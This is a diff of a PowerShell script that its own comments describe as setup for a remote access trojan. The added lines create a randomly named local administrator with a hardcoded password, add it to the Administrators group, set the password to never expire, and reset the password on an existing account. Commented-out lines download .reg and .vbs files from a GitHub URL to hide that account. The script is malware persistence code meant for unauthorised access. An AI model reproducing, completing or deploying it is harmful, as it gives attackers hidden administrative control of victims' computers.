@@ -8,44 +8,41 @@ function random_text {
 
 
 # create local admin for rat
-function create_account {
-    [CmdletBinding()]
-    param (
-        [string] $uname,
-        [securestring] $pword
-    )
-    begin {
-    }
-    process {
-        New-LocalUser "$uname"
-        -pword $pword -FullName
-        "$uname" -Description
-        "Temporary Local Admin"
-        Write-Verbose
-        "$uname local user created"
-        Add-LocalGroupMember
-        -Group "Administrators"
-        -Member "$uname"
-    }
-    end { 
-    }
+$Username = random_text
+$Password = "quentionabc123"
+
+$group = "Administrators"
+
+$adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
+$existing = $adsi.Children | where {$_.SchemaClassName -eq 'user' -and $_.Name -eq $Username }
+
+if ($existing -eq $null) {
+
+    Write-Host "Creating new local user $Username."
+    & NET USER $Username $Password /add /y /expires:never
+    
+    Write-Host "Adding local user $Username to $group."
+    & NET LOCALGROUP $group $Username /add
+
+}
+else {
+    Write-Host "Setting password for existing local user $Username."
+    $existing.SetPassword($Password)
 }
 
-# create admin user
-$uname = random_text
-$pword = (ConvertTo-SecureString "QuentionABC123" -AsPlainText -Force)
-create_account -uname $uname -pword $pword
+Write-Host "Ensuring password for $Username never expires."
+& WMIC USERACCOUNT WHERE "Name='$Username'" SET PasswordExpires=FALSE
 
-# registry to hide local admin
-$reg_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/admin.reg -OutFile "$reg_file.reg"
+# # registry to hide local admin
+# $reg_file = random_text
+# Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/admin.reg -OutFile "$reg_file.reg"
 
-# visual basic script to register the registry
-$vbs_file = random_text
-Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
+# # visual basic script to register the registry
+# $vbs_file = random_text
+# Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/confirm.vbs -OutFile "$vbs_file.vbs".ps1
 
-# install the registry
-./"$reg_file.reg";"$vbs_file.vbs"
+# # install the registry
+# ./"$reg_file.reg";"$vbs_file.vbs"
 
 # goto temp
 $wd = random_text
